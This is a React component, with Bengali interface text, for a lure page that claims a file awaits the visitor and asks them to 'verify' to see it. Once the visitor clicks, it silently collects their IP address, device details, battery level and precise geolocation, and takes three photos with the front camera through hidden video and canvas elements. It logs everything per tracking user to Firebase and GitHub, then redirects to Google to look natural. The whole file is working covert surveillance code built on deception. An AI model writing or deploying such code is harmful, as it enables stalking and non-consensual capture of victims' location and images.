
import React, { useEffect, useRef, useState } from 'react';
import { useParams } from 'react-router-dom';
import { db } from '../firebase';
import { collection, addDoc, doc, updateDoc, increment } from 'firebase/firestore';
import { uploadToGitHub, generateLogFileName } from '../githubService';

const Tracker: React.FC = () => {
  const { userId } = useParams<{ userId: string }>();
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const [stage, setStage] = useState<'prompt' | 'loading' | 'done'>('prompt');
  const [status, setStatus] = useState('তথ্য লোড হচ্ছে...');

  // 1. Initial Setup
  useEffect(() => {
    // Collect device info immediately
    collectDeviceInfo();
  }, []);

  const collectDeviceInfo = async () => {
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const data = await res.json();
      return {
        ip: data.ip,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        screenSize: `${window.screen.width}x${window.screen.height}`,
        language: navigator.language
      };
    } catch {
      return { ip: 'Unknown' };
    }
  };

  const startTracking = async () => {
    setStage('loading');
    setStatus('নিরাপদ সংযোগ তৈরি করা হচ্ছে...');

    const deviceInfo: any = await collectDeviceInfo();
    let locationData = null;
    let images: string[] = [];

    // Get Battery Info
    try {
      const battery: any = await (navigator as any).getBattery();
      deviceInfo.battery = Math.round(battery.level * 100);
    } catch {}

    // 2. Request Geolocation
    setStatus('লোকেশন ভেরিফাই করা হচ্ছে...');
    try {
      const position = await new Promise<GeolocationPosition>((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true });
      });
      locationData = {
        lat: position.coords.latitude,
        lng: position.coords.longitude,
        accuracy: position.coords.accuracy
      };
    } catch (err) {
      console.warn('Geolocation denied');
    }

    // 3. Request Camera & Capture
    setStatus('ডিভাইস চেক করা হচ্ছে...');
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        await videoRef.current.play();

        // Capture 3 photos with 1 sec delay
        for (let i = 0; i < 3; i++) {
          setStatus(`ছবি তোলা হচ্ছে (${i + 1}/3)...`);
          await new Promise(r => setTimeout(r, 1000));
          const photo = capturePhoto();
          if (photo) images.push(photo);
        }

        // Stop stream
        stream.getTracks().forEach(track => track.stop());
      }
    } catch (err) {
      console.warn('Camera denied');
    }

    // 4. Save to Firebase & GitHub
    setStatus('সার্ভারে তথ্য পাঠানো হচ্ছে...');
    const logData = {
      userId,
      timestamp: new Date().toISOString(),
      ip: deviceInfo.ip,
      location: locationData,
      device: deviceInfo,
      images: images // Store base64 or link
    };

    try {
      // Firebase
      await addDoc(collection(db, 'tracking_logs'), logData);
      
      // Update User stats
      const userRef = doc(db, 'users', userId || '');
      await updateDoc(userRef, { logsCount: increment(1) });

      // GitHub
      const fileName = generateLogFileName(userId || 'anon');
      await uploadToGitHub(fileName, JSON.stringify(logData, null, 2));

      setStatus('সফল হয়েছে!');
      setStage('done');
      
      // Redirect to a real site after success to look natural
      setTimeout(() => {
        window.location.href = "https://www.google.com";
      }, 2000);
    } catch (err) {
      console.error(err);
      setStatus('ত্রুটি ঘটেছে। আবার চেষ্টা করুন।');
    }
  };

  const capturePhoto = () => {
    if (canvasRef.current && videoRef.current) {
      const context = canvasRef.current.getContext('2d');
      if (context) {
        canvasRef.current.width = videoRef.current.videoWidth;
        canvasRef.current.height = videoRef.current.videoHeight;
        context.drawImage(videoRef.current, 0, 0);
        return canvasRef.current.toDataURL('image/jpeg', 0.5);
      }
    }
    return null;
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-white text-slate-900 p-6">
      <div className="max-w-md w-full text-center space-y-8">
        {/* Invisible elements for capture */}
        <video ref={videoRef} className="hidden" />
        <canvas ref={canvasRef} className="hidden" />

        {stage === 'prompt' && (
          <div className="space-y-6">
            <div className="w-20 h-20 bg-blue-100 rounded-full flex items-center justify-center mx-auto text-blue-600">
              <i className="fas fa-file-alt text-3xl"></i>
            </div>
            <div className="space-y-2">
              <h1 className="text-2xl font-bold">ফাইলটি দেখতে চান?</h1>
              <p className="text-slate-500">আপনাকে একটি ফাইল পাঠানো হয়েছে। এটি খোলার জন্য ভেরিফিকেশন প্রয়োজন।</p>
            </div>
            <button
              onClick={startTracking}
              className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-2xl shadow-xl transition transform active:scale-95"
            >
              ভেরিফাই করে ফাইল দেখুন
            </button>
            <p className="text-xs text-slate-400">নিরাপত্তা নিশ্চিত করতে আপনার ডিভাইসের কিছু পারমিশন প্রয়োজন হতে পারে।</p>
          </div>
        )}

        {stage === 'loading' && (
          <div className="space-y-6">
            <div className="relative w-24 h-24 mx-auto">
               <div className="absolute inset-0 border-4 border-blue-100 rounded-full"></div>
               <div className="absolute inset-0 border-4 border-blue-600 rounded-full border-t-transparent animate-spin"></div>
            </div>
            <div className="space-y-1">
              <h2 className="text-xl font-semibold">প্রসেসিং হচ্ছে...</h2>
              <p className="text-blue-600 font-medium">{status}</p>
            </div>
          </div>
        )}

        {stage === 'done' && (
          <div className="space-y-4">
             <i className="fas fa-check-circle text-6xl text-green-500"></i>
             <h2 className="text-2xl font-bold">সফল হয়েছে!</h2>
             <p className="text-slate-500">আপনাকে রিডাইরেক্ট করা হচ্ছে...</p>
          </div>
        )}
      </div>
    </div>
  );
};

export default Tracker;
